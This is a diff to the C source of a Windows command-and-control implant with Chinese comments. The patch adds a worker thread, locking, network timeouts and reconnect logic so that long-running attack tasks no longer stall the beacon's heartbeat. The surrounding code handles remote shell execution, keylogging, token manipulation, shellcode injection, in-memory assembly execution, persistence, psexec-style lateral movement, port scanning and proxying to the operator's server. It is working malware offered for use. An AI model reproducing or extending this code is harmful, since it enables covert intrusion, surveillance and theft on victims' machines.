@@ -330,6 +330,26 @@ static unsigned char *g_pt;      /* 明文: 上行组装 / 下行批次 */
 static unsigned char *g_out;     /* 出站 TLV 累积 (outbox) */
 static unsigned int   g_outlen;
 
+/* ---- 异步任务线程共享状态 (见 worker_proc 的说明) ---- */
+#define TASKQ_MAX 64
+typedef struct {
+    unsigned int  id;
+    unsigned char cls;
+    char          alias[32];
+    unsigned int  arglen;
+    unsigned char *arg;        /* VirtualAlloc 复制的参数, 脱离下行缓冲生命周期 */
+} qtask;
+
+static qtask g_taskq[TASKQ_MAX];
+static int   g_taskq_head, g_taskq_tail, g_taskq_n;
+static CRITICAL_SECTION g_cs;        /* 保护 outbox 与任务队列的单一锁 */
+static HANDLE  g_task_evt;
+static HANDLE  g_worker;
+static volatile int g_exiting;
+
+static unsigned char *g_wscratch;    /* 工作线程私有命令暂存 */
+static unsigned char *g_wxf_out;     /* 工作线程私有 xform 缓冲 (execute-assembly) */
+
 static HINTERNET g_hs, g_hc;
 static char      g_meta[512];    /* 元信息 (0x1F 分隔); 偏移 200 起复用为 cwd */
 
@@ -639,7 +659,11 @@ static unsigned int build_meta(char *out, unsigned int cap)
 
 static int box_space(unsigned int need)
 {
-    return (g_outlen + need) <= MAX_PLAIN;
+    int ok;
+    EnterCriticalSection(&g_cs);
+    ok = (g_outlen + need) <= MAX_PLAIN;
+    LeaveCriticalSection(&g_cs);
+    return ok;
 }
 
 /* 预留 TLV 空间, 返回数据写入位置 (相对 g_out)。
@@ -650,19 +674,27 @@ static unsigned int box_begin(unsigned short type, unsigned int need)
 {
     unsigned int start;
 
-    if (!box_space(need + 6u)) return BOX_FAIL;
+    /* 加锁到 box_end: 保证"预留-写入-提交"这一整条 TLV 的写入是原子的。
+     * 工作线程和主循环的 pump 都在往 outbox 追加, 不加锁会在预留与提交之间
+     * 被互相打断, 产生长度错位的脏 TLV。 */
+    EnterCriticalSection(&g_cs);
+    if (!box_space(need + 6u)) {
+        LeaveCriticalSection(&g_cs);
+        return BOX_FAIL;
+    }
 
     start = g_outlen;
     cs_put_be16(g_out + start, type);
     cs_put_be32(g_out + start + 2, 0);          /* 长度占位 */
     g_outlen = start + 6u;
-    return start;
+    return start;                               /* 锁保持到 box_end */
 }
 
 static void box_end(unsigned int start, unsigned int datalen)
 {
     cs_put_be32(g_out + start + 2, datalen);
     g_outlen = start + 6u + datalen;
+    LeaveCriticalSection(&g_cs);
 }
 
 static void box_result(unsigned int task_id, unsigned char status,
@@ -1457,6 +1489,12 @@ static unsigned int c2_post(const unsigned char *data, unsigned int len,
                             WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
     if (!hR) return 0;
 
+    /* 单次请求有界: 解析/连接各 5s, 收发各 15s。
+     * 没有超时的 WinHTTP 会在服务端卡住响应时把植入体永久堵死在
+     * WinHttpReceiveResponse / WinHttpReadData 里 —— 这是"一条一条堵死通信"的
+     * 最主要来源。超时后 c2_post 返回 0, 主循环按网络失败处理并保留 outbox 重试。 */
+    WinHttpSetTimeouts(hR, 5000, 5000, 15000, 15000);
+
     if (C2_SSL) {
         DWORD opt = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                   | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
@@ -1600,13 +1638,35 @@ static unsigned int cmd_shell(const char *cmd, unsigned char *out, unsigned int 
 
     if (!ok) { CloseHandle(hRd); return 0; }
 
-    for (;;) {
-        if (!ReadFile(hRd, buf, sizeof(buf), &got, NULL) || got == 0) break;
-        if (total + got > cap) got = cap - total;
-        if (got == 0) break;
-        bmemcpy(out + total, buf, got);
-        total += got;
-        if (total >= cap) break;
+    /* 有界读取: 用 PeekNamedPipe 轮询, 最多等 10 秒。
+     *
+     * 原实现是裸 ReadFile 循环 —— 一旦命令长驻 (ping -t / powershell / 一个
+     * 不主动关 stdout 的子进程), 管道永远不 EOF, ReadFile 永远阻塞, 整个植入体
+     * 就死在这里, 心跳停摆。这里改成: 进程退出且无残留数据即正常结束, 超时则
+     * TerminateProcess 强制收场, 保证任何一条 shell 命令都堵不死通信。 */
+    {
+        DWORD t0 = GetTickCount();
+        for (;;) {
+            DWORD avail = 0;
+            DWORD now = GetTickCount();
+
+            if (!PeekNamedPipe(hRd, NULL, 0, NULL, &avail, NULL)) break;
+
+            if (avail == 0) {
+                if (WaitForSingleObject(pi.hProcess, 0) == WAIT_OBJECT_0) break; /* 正常结束 */
+                if (now - t0 > 10000u) { TerminateProcess(pi.hProcess, 1); break; } /* 超时收场 */
+                Sleep(30);
+                continue;
+            }
+
+            if (avail > sizeof(buf)) avail = sizeof(buf);
+            if (total + avail > cap) avail = cap - total;
+            if (avail == 0) break;
+            if (!ReadFile(hRd, buf, avail, &got, NULL) || got == 0) break;
+            bmemcpy(out + total, buf, got);
+            total += got;
+            if (total >= cap) break;
+        }
     }
 
     CloseHandle(hRd);
@@ -2065,7 +2125,7 @@ static void do_upload(const cs_task *t)
 
 static unsigned char *g_scratch;    /* 命令输出暂存 */
 
-static void run_task(const cs_task *t);
+static void run_task(const cs_task *t, unsigned char *scratch);
 
 /* 暂存一个传输类任务 (参数必须复制: t->arg 指向会被下一批覆盖的下行缓冲) */
 static void pend_push(const cs_task *t)
@@ -2105,11 +2165,11 @@ static void pend_run(void)
         for (k = i; k + 1 < g_pend_n; k++) g_pend[k] = g_pend[k + 1];
         g_pend_n--;
 
-        run_task(&t);
+        run_task(&t, g_scratch);
     }
 }
 
-static void run_task(const cs_task *t)
+static void run_task(const cs_task *t, unsigned char *scratch)
 {
     unsigned int n = 0;
 
@@ -2124,8 +2184,8 @@ static void run_task(const cs_task *t)
 
     case CMD_EXEC_SHELL:
         {
-            char *cmd = (char *)g_scratch;
-            unsigned char *tmp = g_scratch + 4096;
+            char *cmd = (char *)scratch;
+            unsigned char *tmp = scratch + 4096;
             unsigned int L = t->arglen < 4000u ? t->arglen : 4000u;
             bmemcpy(cmd, t->arg, L);
             cmd[L] = 0;
@@ -2236,7 +2296,7 @@ static void run_task(const cs_task *t)
 
     case CMD_KEYLOG:
         {
-            unsigned char *tmp = g_scratch + 4096;
+            unsigned char *tmp = scratch + 4096;
             int start = (t->arglen > 0 && t->arg[0]) ? 1 : 0;
             if (start) {
                 n = ops_keylog(1, tmp, 400000u);
@@ -2264,7 +2324,7 @@ static void run_task(const cs_task *t)
 
     case CMD_TOKEN:
         {
-            unsigned char *tmp = g_scratch + 4096;
+            unsigned char *tmp = scratch + 4096;
             char sub[32], argb[220];
             unsigned int i = 0, j = 0;
             while (i < t->arglen && t->arg[i] != ' ' && i < sizeof(sub) - 1) {
@@ -2283,7 +2343,7 @@ static void run_task(const cs_task *t)
 
     case CMD_INJ_PROC:
         {
-            unsigned char *tmp = g_scratch + 4096;
+            unsigned char *tmp = scratch + 4096;
             if (t->arglen < 5u) {
                 box_result_str(t->id, ST_ERR, "[-] 用法: inject <pid> <base64 shellcode>\r\n");
             } else {
@@ -2298,7 +2358,7 @@ static void run_task(const cs_task *t)
         {
             /* arg = [4B cofflen][4B arglen][coff][参数块]
              * 参数块是大端 [4B 长度][数据] 序列 (与 CS 一致, 见 go 侧 bofPack) */
-            unsigned char *tmp = g_scratch + 4096;
+            unsigned char *tmp = scratch + 4096;
             unsigned int cofflen, barglen, outlen = 0;
             int rc;
 
@@ -2335,7 +2395,7 @@ static void run_task(const cs_task *t)
         {
             /* arg = [4B asmlen][4B argslen][4B stubblen][asm][args][stub]
              * 目标程序集全程走 base64 参数进内存; 只有通用引导 stub 落地。 */
-            unsigned char *tmp = g_scratch + 4096;
+            unsigned char *tmp = scratch + 4096;
             unsigned int asmlen, argslen, stubblen, b64len = 0;
             const unsigned char *asmB, *argsB, *stubB;
             char stubPath[340], outPath[340];
@@ -2371,16 +2431,18 @@ static void run_task(const cs_task *t)
             }
             DeleteFileA(outPath);
 
-            /* base64(程序集) 放进 g_xf_out 前半区, 完整参数放后半区 */
-            if (xform_one(XF_BASE64, 0, asmB, asmlen, g_xf_out,
+            /* base64(程序集) 放进 g_wxf_out 前半区, 完整参数放后半区。
+             * 用工作线程私有缓冲: 本命令在异步线程里执行, 主循环的 c2_post
+             * 也使用 g_xf_out 做 body 变换, 共用会互相踩。 */
+            if (xform_one(XF_BASE64, 0, asmB, asmlen, g_wxf_out,
                           XF_BUF_SIZE / 2u, &b64len) != 0) {
                 DeleteFileA(stubPath);
                 box_result_str(t->id, ST_ERR,
                     "[-] 程序集过大或编码失败 (上限约 1.5 MB)\r\n");
                 break;
             }
-            g_xf_out[b64len] = 0;
-            argbuf = (char *)g_xf_out + XF_BUF_SIZE / 2u;
+            g_wxf_out[b64len] = 0;
+            argbuf = (char *)g_wxf_out + XF_BUF_SIZE / 2u;
 
 #define CLR_PUSH(s) do {                                    \
                 const char *p_ = (s);                       \
@@ -2389,7 +2451,7 @@ static void run_task(const cs_task *t)
                     argbuf[abi++] = p_[q_++];               \
             } while (0)
 
-            CLR_PUSH((const char *)g_xf_out);
+            CLR_PUSH((const char *)g_wxf_out);
             CLR_PUSH("|");
             for (k = 0; k < argslen; k++) {
                 char c = (char)argsB[k];
@@ -2428,7 +2490,7 @@ static void run_task(const cs_task *t)
 
     case CMD_PERSIST:
         {
-            unsigned char *tmp = g_scratch + 4096;
+            unsigned char *tmp = scratch + 4096;
             int mode = (t->arglen > 0) ? (int)t->arg[0] : 0;
             char nm[80];
             unsigned int k = 0;
@@ -2447,7 +2509,7 @@ static void run_task(const cs_task *t)
             /* arg = "<op> <rest>"; op 目前支持:
              *   psexec <host> <cmd>   原生 SCM 实现 (不走 sc.exe)
              */
-            unsigned char *tmp = g_scratch + 4096;
+            unsigned char *tmp = scratch + 4096;
             char op[16];
             char rest2[420];
             unsigned int i = 0, j = 0;
@@ -2492,7 +2554,7 @@ static void run_task(const cs_task *t)
 
     case CMD_PORTSCAN:
         {
-            unsigned char *tmp = g_scratch + 4096;
+            unsigned char *tmp = scratch + 4096;
             char host[128], ports[128];
             unsigned int i = 0, j = 0;
             while (i < t->arglen && t->arg[i] != ' ' && i < sizeof(host) - 1) {
@@ -2511,7 +2573,7 @@ static void run_task(const cs_task *t)
 
     case CMD_PROC_LIST:
         {
-            unsigned char *tmp = g_scratch + 4096;
+            unsigned char *tmp = scratch + 4096;
             n = cmd_proc_list(tmp, 400000);
             box_result(t->id, ST_OK, tmp, n);
         }
@@ -2519,7 +2581,7 @@ static void run_task(const cs_task *t)
 
     case CMD_PS_LIST:
         {
-            unsigned char *tmp = g_scratch + 4096;
+            unsigned char *tmp = scratch + 4096;
             n = cmd_ps_list(tmp, 400000);
             box_result(t->id, ST_OK, tmp, n);
         }
@@ -2527,7 +2589,7 @@ static void run_task(const cs_task *t)
 
     case CMD_FS_OPS:
         {
-            unsigned char *tmp = g_scratch + 4096;
+            unsigned char *tmp = scratch + 4096;
             char op = (t->arglen > 0) ? (char)t->arg[0] : 0;
             char argbuf[400];
             unsigned int L = 0;
@@ -2572,7 +2634,7 @@ static void run_task(const cs_task *t)
 
     case CMD_PROXY:
         {
-            unsigned char *tmp = g_scratch + 4096;
+            unsigned char *tmp = scratch + 4096;
             n = proxy_task(t->arg, t->arglen, (char *)tmp, 400000u);
             if (n > 0) box_result(t->id, ST_OK, tmp, n);
         }
@@ -2580,7 +2642,7 @@ static void run_task(const cs_task *t)
 
     case CMD_RPORTFWD:
         {
-            unsigned char *tmp = g_scratch + 4096;
+            unsigned char *tmp = scratch + 4096;
             n = rportfwd_task(t->arg, t->arglen, (char *)tmp, 400000u);
             box_result(t->id, ST_OK, tmp, n);
         }
@@ -2590,6 +2652,106 @@ static void run_task(const cs_task *t)
         box_result_str(t->id, ST_ERR, "[-] 该命令类别尚未实现\r\n");
         break;
     }
+}
+
+/* ------------------------------------------------------------ 异步任务线程
+ *
+ * 把长阻塞命令 (shell / inject / BOF / execute-assembly / token / portscan)
+ * 从心跳主循环剥离到独立工作线程, 主循环只做: 睡眠 -> 泵 -> 收发 -> 派发。
+ * 这样一条 10 秒的 shell 命令不会让心跳停摆 (旧实现"一条一条堵死通信"的根因)。
+ *
+ * 并发安全边界:
+ *   - outbox (g_out/g_outlen) 由单一 CRITICAL_SECTION g_cs 保护;
+ *     box_begin 加锁、box_end 解锁, 任何一条 TLV 的"预留-写入-提交"都是原子的。
+ *   - 工作线程有自己的暂存 g_wscratch / g_wxf_out, 不与主循环共用。
+ *   - 任务参数在入队时 VirtualAlloc 复制, 脱离会被下一批覆盖的下行缓冲。
+ *   - 涉及模块状态机的命令 (keylog/screenshot/proxy/download/rportfwd) 仍留在
+ *     主循环同步执行 —— 它们的 pump 都跑在主循环上, 跨线程会破坏其内部状态。 */
+
+static int task_is_async(unsigned char cls)
+{
+    return cls == CMD_EXEC_SHELL || cls == CMD_INJ_PROC || cls == CMD_INJ_BOF ||
+           cls == CMD_INJ_ASSEMBLY || cls == CMD_TOKEN || cls == CMD_PORTSCAN;
+}
+
+static int taskq_push(const cs_task *t)
+{
+    unsigned char *copy = NULL;
+
+    if (t->arglen > 0) {
+        copy = (unsigned char *)VirtualAlloc(NULL, t->arglen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!copy) {
+            box_result_str(t->id, ST_ERR, "[-] 内存不足, 任务未执行\r\n");
+            return 0;
+        }
+        bmemcpy(copy, t->arg, t->arglen);
+    }
+
+    EnterCriticalSection(&g_cs);
+    if (g_taskq_n < TASKQ_MAX) {
+        qtask *q = &g_taskq[g_taskq_tail];
+        q->id = t->id;
+        q->cls = t->cls;
+        bmemcpy(q->alias, t->alias, sizeof(q->alias));
+        q->arglen = t->arglen;
+        q->arg = copy;
+        g_taskq_tail = (g_taskq_tail + 1) % TASKQ_MAX;
+        g_taskq_n++;
+        SetEvent(g_task_evt);
+        LeaveCriticalSection(&g_cs);
+        return 1;
+    }
+    LeaveCriticalSection(&g_cs);
+
+    if (copy) VirtualFree(copy, 0, MEM_RELEASE);
+    box_result_str(t->id, ST_BUSY, "[-] 任务队列已满\r\n");
+    return 0;
+}
+
+static DWORD WINAPI worker_proc(LPVOID param)
+{
+    (void)param;
+
+    for (;;) {
+        qtask q;
+        cs_task t;
+        int have = 0;
+
+        WaitForSingleObject(g_task_evt, INFINITE);
+
+        EnterCriticalSection(&g_cs);
+        if (g_taskq_n > 0) {
+            q = g_taskq[g_taskq_head];
+            g_taskq_head = (g_taskq_head + 1) % TASKQ_MAX;
+            g_taskq_n--;
+            have = 1;
+        }
+        if (g_taskq_n == 0) ResetEvent(g_task_evt);
+        LeaveCriticalSection(&g_cs);
+
+        if (!have) {
+            if (g_exiting) break;
+            continue;
+        }
+
+        t.id = q.id;
+        t.cls = q.cls;
+        bmemcpy(t.alias, q.alias, sizeof(t.alias));
+        t.arg = q.arg;
+        t.arglen = q.arglen;
+
+        run_task(&t, g_wscratch);
+
+        if (q.arg) VirtualFree(q.arg, 0, MEM_RELEASE);
+
+        if (g_exiting) {
+            EnterCriticalSection(&g_cs);
+            have = (g_taskq_n == 0);
+            LeaveCriticalSection(&g_cs);
+            if (have) break;
+        }
+    }
+    return 0;
 }
 
 /* ------------------------------------------------------------ 主循环 */
@@ -2613,6 +2775,7 @@ static void GetCommandLineA_into(char *dst, unsigned int cap)
 int beacon_run(void)
 {
     unsigned int flen, rlen;
+    unsigned int fail = 0;   /* 连续通信失败计数: 达到阈值即重连会话 */
     int plen;
 
     /* 启动口令门控: 命令行(或环境变量)里没有正确口令就安静退出。
@@ -2643,8 +2806,11 @@ int beacon_run(void)
     g_scratch = (unsigned char *)VirtualAlloc(NULL, 512u * 1024u, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     g_xf_out  = (unsigned char *)VirtualAlloc(NULL, XF_BUF_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     g_xf_in   = (unsigned char *)VirtualAlloc(NULL, XF_BUF_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    g_wscratch = (unsigned char *)VirtualAlloc(NULL, 512u * 1024u, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    g_wxf_out  = (unsigned char *)VirtualAlloc(NULL, XF_BUF_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-    if (!g_tx || !g_rx || !g_pt || !g_out || !g_scratch || !g_xf_out || !g_xf_in) return 1;
+    if (!g_tx || !g_rx || !g_pt || !g_out || !g_scratch || !g_xf_out || !g_xf_in ||
+        !g_wscratch || !g_wxf_out) return 1;
 
     if (xform_chain_parse(&g_xf, C2_XFORM) != 0) g_xf.n = 0;   /* 解析失败则退回 raw */
 
@@ -2660,6 +2826,13 @@ int beacon_run(void)
 
     if (!csdev_make_session_keys(g_sess_state.aes_key, g_sess_state.hmac_key)) return 2;
     if (!c2_open()) return 3;
+
+    /* 启动异步任务工作线程 (锁/事件/线程)。所有 box_* 都依赖 g_cs, 必须先初始化。 */
+    InitializeCriticalSection(&g_cs);
+    g_task_evt = CreateEventA(NULL, FALSE, FALSE, NULL);
+    if (!g_task_evt) return 3;
+    g_worker = CreateThread(NULL, 0, worker_proc, NULL, 0, NULL);
+    if (!g_worker) { CloseHandle(g_task_evt); g_task_evt = NULL; return 3; }
 
     /* 采集元信息 */
     {
@@ -2690,13 +2863,14 @@ int beacon_run(void)
         for (i = 0; i < count; i++) {
             cs_task t;
             if (!cs_batch_task(g_pt, (unsigned int)plen, i, &t)) break;
-            run_task(&t);
+            if (task_is_async(t.cls)) taskq_push(&t);
+            else run_task(&t, g_scratch);
         }
     }
 
     /* ---- 主循环 ---- */
     for (;;) {
-        unsigned int up = 0, start;
+        unsigned int up = 0, oblen = 0;
 
         beacon_sleep(g_sess_state.sleep_ms, g_sess_state.jitter);
 
@@ -2707,12 +2881,13 @@ int beacon_run(void)
         proxy_pump();          /* 推进 SOCKS 转发与 rportfwd 监听 */
         shotstream_pump();     /* 截图流: 取走最新一帧 */
 
-        /* 组装上行明文: outbox 内容 + 心跳 */
-        if (g_outlen > 0) {
-            bmemcpy(g_pt, g_out, g_outlen);
-            up = g_outlen;
-        }
-        start = up;
+        /* 组装上行明文: outbox 快照 + 心跳。
+         * 锁内快照: 工作线程此刻可能正通过 box_result 往 outbox 追加结果。 */
+        EnterCriticalSection(&g_cs);
+        oblen = g_outlen;
+        if (oblen > 0) bmemcpy(g_pt, g_out, oblen);
+        LeaveCriticalSection(&g_cs);
+        up = oblen;
         {
             unsigned char hb[8];
             unsigned long long now = (unsigned long long)GetTickCount64();
@@ -2720,7 +2895,6 @@ int beacon_run(void)
             cs_put_be32(hb + 4, (unsigned int)(now & 0xFFFFFFFFull));
             up += cs_tlv_write(g_pt + up, MAX_PLAIN - up, T_HEARTBEAT, hb, 8);
         }
-        (void)start;
 
         flen = cs_frame_seal(&g_sess_state, F_HASRESULT, g_pt, up, g_tx, MAX_FRAME);
         if (!flen) { beacon_sleep(5000, 0); continue; }
@@ -2728,12 +2902,33 @@ int beacon_run(void)
         rlen = c2_post(g_tx, flen, g_rx, MAX_FRAME);
         if (rlen < CS_FRAME_HDR) {
             /* 网络失败: 保留 outbox 待下次重试 (上限保护) */
-            if (g_outlen > MAX_PLAIN - 1024u) g_outlen = 0;
+            if (g_outlen > MAX_PLAIN - 1024u) {
+                EnterCriticalSection(&g_cs);
+                g_outlen = 0;
+                LeaveCriticalSection(&g_cs);
+            }
+            /* 连续失败达阈值即重连: 拆掉并重建会话句柄, 避免被一个楔死的连接
+             * (半开 TCP / 挂起的代理) 拖垮后续每一轮请求。 */
+            if (++fail >= 3) {
+                c2_close();
+                c2_open();
+                fail = 0;
+            }
             continue;
         }
+        fail = 0;
 
-        /* 发送成功才清空 outbox */
-        g_outlen = 0;
+        /* 发送成功: 消费掉已发送的 oblen 前缀, 保留工作线程在发送期间新追加的结果 */
+        if (oblen > 0) {
+            EnterCriticalSection(&g_cs);
+            if (g_outlen > oblen) {
+                bmemcpy(g_out, g_out + oblen, g_outlen - oblen);
+                g_outlen -= oblen;
+            } else {
+                g_outlen = 0;
+            }
+            LeaveCriticalSection(&g_cs);
+        }
 
         plen = cs_frame_open(&g_sess_state, g_rx, rlen, g_pt, MAX_PLAIN);
         if (plen <= 0) continue;
@@ -2745,12 +2940,21 @@ int beacon_run(void)
                 cs_task t;
                 if (!cs_batch_task(g_pt, (unsigned int)plen, i, &t)) break;
                 if (t.cls == CMD_EXIT) want_exit = 1;
-                run_task(&t);
+                if (task_is_async(t.cls)) {
+                    taskq_push(&t);           /* 长阻塞命令交工作线程, 主循环立即进入下一轮 */
+                } else {
+                    run_task(&t, g_scratch);
+                }
             }
             if (want_exit) {
-                /* 把结束回执发出去再退出 */
+                /* 通知工作线程退出, 有界等待它把队列跑完, 再把结束回执发出去 */
                 unsigned int x = 0;
+                g_exiting = 1;
+                SetEvent(g_task_evt);
+                WaitForSingleObject(g_worker, 8000);
+                EnterCriticalSection(&g_cs);
                 if (g_outlen > 0) { bmemcpy(g_pt, g_out, g_outlen); x = g_outlen; }
+                LeaveCriticalSection(&g_cs);
                 flen = cs_frame_seal(&g_sess_state, F_HASRESULT, g_pt, x, g_tx, MAX_FRAME);
                 if (flen) c2_post(g_tx, flen, g_rx, MAX_FRAME);
                 c2_close();
